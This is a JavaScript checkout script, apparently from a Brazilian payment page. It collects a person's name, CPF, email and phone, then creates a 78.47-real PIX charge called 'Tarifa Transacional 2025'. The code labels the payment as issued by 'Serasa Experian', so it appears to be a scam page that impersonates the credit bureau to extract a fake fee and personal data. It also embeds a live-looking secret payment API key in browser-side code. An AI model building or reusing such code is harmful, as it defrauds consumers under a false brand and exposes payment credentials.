document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('checkoutForm');
    
    // Format CPF input
    const cpfInput = form.querySelector('input[placeholder="000.000.000-00"]');
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length <= 11) {
            value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            e.target.value = value;
        }
    });

    // Format phone input
    const phoneInput = form.querySelector('input[placeholder="(00) 00000-0000"]');
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length <= 11) {
            value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            e.target.value = value;
        }
    });

    // Show error message
    function showError(input, message) {
        const errorDiv = input.parentElement.querySelector('.error-message');
        if (!errorDiv) {
            const div = document.createElement('div');
            div.className = 'error-message text-red-500 text-sm mt-1';
            div.textContent = message;
            input.parentElement.appendChild(div);
        }
        input.classList.add('border-red-500', 'input-error');
    }

    // Clear error message
    function clearError(input) {
        const errorDiv = input.parentElement.querySelector('.error-message');
        if (errorDiv) {
            errorDiv.remove();
        }
        input.classList.remove('border-red-500', 'input-error');
    }

    // Validate CPF
    function validateCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11) return false;
        
        // Check for known invalid CPFs
        if (/^(\d)\1{10}$/.test(cpf)) return false;
        
        // Validate CPF algorithm
        let sum = 0;
        for (let i = 0; i < 9; i++) {
            sum += parseInt(cpf.charAt(i)) * (10 - i);
        }
        let remainder = (sum * 10) % 11;
        if (remainder === 10 || remainder === 11) remainder = 0;
        if (remainder !== parseInt(cpf.charAt(9))) return false;
        
        sum = 0;
        for (let i = 0; i < 10; i++) {
            sum += parseInt(cpf.charAt(i)) * (11 - i);
        }
        remainder = (sum * 10) % 11;
        if (remainder === 10 || remainder === 11) remainder = 0;
        if (remainder !== parseInt(cpf.charAt(10))) return false;
        
        return true;
    }

    // Validate form
    function validateForm() {
        let isValid = true;
        const inputs = form.querySelectorAll('input[required]');
        
        inputs.forEach(input => {
            clearError(input);
            
            if (!input.value.trim()) {
                showError(input, 'Este campo é obrigatório');
                isValid = false;
                return;
            }

            if (input.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input.value)) {
                showError(input, 'E-mail inválido');
                isValid = false;
                return;
            }

            if (input.placeholder === '000.000.000-00') {
                if (!/^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(input.value)) {
                    showError(input, 'CPF deve ter o formato 000.000.000-00');
                    isValid = false;
                    return;
                }
                if (!validateCPF(input.value)) {
                    showError(input, 'CPF inválido');
                    isValid = false;
                    return;
                }
            }

            if (input.placeholder === '(00) 00000-0000' && !/^\(\d{2}\) \d{5}-\d{4}$/.test(input.value)) {
                showError(input, 'Telefone deve ter o formato (00) 00000-0000');
                isValid = false;
                return;
            }
        });

        return isValid;
    }

    // Form submission - CORRIGIDO COM ESTRUTURA EXATA DA BLACKCAT
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        if (!validateForm()) {
            return;
        }

        // Show loading state
        const submitButton = form.querySelector('button[type="submit"]');
        const originalButtonText = submitButton.innerHTML;
        submitButton.disabled = true;
        submitButton.innerHTML = `
            <div class="loading-spinner mr-2"></div>
            Processando...
        `;

        try {
            const formData = {
                name: form.querySelector('input[type="text"]').value.trim(),
                cpf: cpfInput.value,
                email: form.querySelector('input[type="email"]').value.trim(),
                phone: phoneInput.value
            };

            console.log('📋 Dados do formulário:', formData);

            // BlackCat API credentials
            const publicKey = 'pk_pXb05DCxytcnz8SViYmOjSo2BlHKf0vUlpegTgmgkfwdNF-7';
            const secretKey = 'sk_Br-pkbauum5bAzSRqqHa1kfcirDqVLrVMRu5Dr-gZdn2B4WP';

            // Estrutura CORRIGIDA conforme erro da BlackCat
            const requestBody = {
                amount: 7847,
                paymentMethod: 'pix',
                items: [
                    {
                        title: 'Tarifa Transacional 2025', // CORRIGIDO: title em vez de name
                        quantity: 1,
                        unitPrice: 7847, // CORRIGIDO: unitPrice em vez de price
                        tangible: false // ADICIONADO: campo obrigatório
                    }
                ],
                customer: {
                    name: formData.name,
                    email: formData.email,
                    document: {
                        number: formData.cpf.replace(/\D/g, ''),
                        type: 'cpf'
                    }
                }
            };

            console.log('🚀 Enviando para BlackCat API (CORRIGIDO):', JSON.stringify(requestBody, null, 2));

            // Fazer requisição para BlackCat API
            const response = await fetch('https://api.blackcatpagamentos.com/v1/transactions', {
                method: 'POST',
                headers: {
                    'Authorization': 'Basic ' + btoa(publicKey + ':' + secretKey),
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(requestBody)
            });

            console.log('📊 Status da resposta:', response.status);

            // Capturar resposta completa
            const responseText = await response.text();
            console.log('📄 Resposta completa:', responseText);

            let responseData = {};
            try {
                responseData = JSON.parse(responseText);
                console.log('📄 Resposta parseada:', responseData);
            } catch (e) {
                console.error('❌ Erro ao parsear JSON:', e);
            }

            if (response.ok) {
                console.log('✅ SUCESSO! PIX gerado pelo Serasa!');
                console.log('🎉 Dados da transação:', responseData);
                
                // Armazenar dados da transação REAL
                const transactionData = {
                    ...responseData,
                    customer: formData,
                    amount: 7847,
                    description: 'Tarifa Transacional 2025'
                };

                localStorage.setItem('transactionData', JSON.stringify(transactionData));

                // Mostrar sucesso e redirecionar
                const successDiv = document.createElement('div');
                successDiv.className = 'bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative mb-4';
                successDiv.innerHTML = `
                    <strong class="font-bold">🎉 PIX Gerado com Sucesso!</strong>
                    <span class="block sm:inline">PIX Serasa Experian criado! Redirecionando para pagamento...</span>
                    <div class="text-sm mt-1">ID: ${responseData.id || 'N/A'}</div>
                `;
                form.insertBefore(successDiv, form.firstChild);

                setTimeout(() => {
                    window.location.href = 'payment.html';
                }, 2000);

            } else {
                console.error('❌ Erro da API BlackCat');
                console.error('Status:', response.status);
                console.error('Resposta:', responseData);
                
                let errorMessage = 'Erro ao gerar PIX real da BlackCat.';
                
                if (response.status === 400) {
                    errorMessage = 'Dados inválidos na requisição BlackCat.';
                    if (responseData.message) {
                        errorMessage += ` ${responseData.message}`;
                    }
                    if (responseData.error) {
                        errorMessage += ` Detalhes: ${JSON.stringify(responseData.error)}`;
                    }
                } else if (response.status === 401) {
                    errorMessage = 'Credenciais inválidas. Chaves da API BlackCat incorretas.';
                } else if (response.status === 403) {
                    errorMessage = 'Acesso negado. Conta BlackCat inativa ou sem permissão.';
                } else if (response.status === 422) {
                    errorMessage = 'Dados não processáveis pela BlackCat.';
                } else if (response.status === 500) {
                    errorMessage = 'Erro interno da BlackCat. Tente novamente.';
                }

                // Mostrar erro detalhado
                const errorDiv = document.createElement('div');
                errorDiv.className = 'bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4';
                errorDiv.innerHTML = `
                    <strong class="font-bold">❌ Erro BlackCat!</strong>
                    <span class="block sm:inline">${errorMessage}</span>
                    <div class="mt-2 text-sm">
                        <p><strong>Status:</strong> ${response.status}</p>
                        <p><strong>Resposta:</strong> ${responseText}</p>
                        <hr class="my-2">
                        <p><strong>Possíveis soluções:</strong></p>
                        <ul class="list-disc list-inside mt-1">
                            <li>Verificar se as credenciais estão corretas</li>
                            <li>Confirmar se a conta está ativa e em produção</li>
                            <li>Verificar se PIX está habilitado na conta</li>
                            <li>Entrar em contato com suporte BlackCat</li>
                        </ul>
                    </div>
                `;
                form.insertBefore(errorDiv, form.firstChild);

                // Reset button state
                submitButton.disabled = false;
                submitButton.innerHTML = originalButtonText;

                // Remove error message after 20 seconds
                setTimeout(() => {
                    if (errorDiv.parentNode) {
                        errorDiv.remove();
                    }
                }, 20000);
            }

        } catch (error) {
            console.error('❌ Erro de rede:', error);
            
            // Mostrar erro de rede
            const errorDiv = document.createElement('div');
            errorDiv.className = 'bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4';
            errorDiv.innerHTML = `
                <strong class="font-bold">❌ Erro de Conexão!</strong>
                <span class="block sm:inline">Erro ao conectar com BlackCat: ${error.message}</span>
            `;
            form.insertBefore(errorDiv, form.firstChild);

            // Reset button state
            submitButton.disabled = false;
            submitButton.innerHTML = originalButtonText;

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.remove();
                }
            }, 10000);
        }
    });

    // Clear error when input changes
    form.querySelectorAll('input').forEach(input => {
        input.addEventListener('input', () => {
            clearError(input);
        });
    });
});
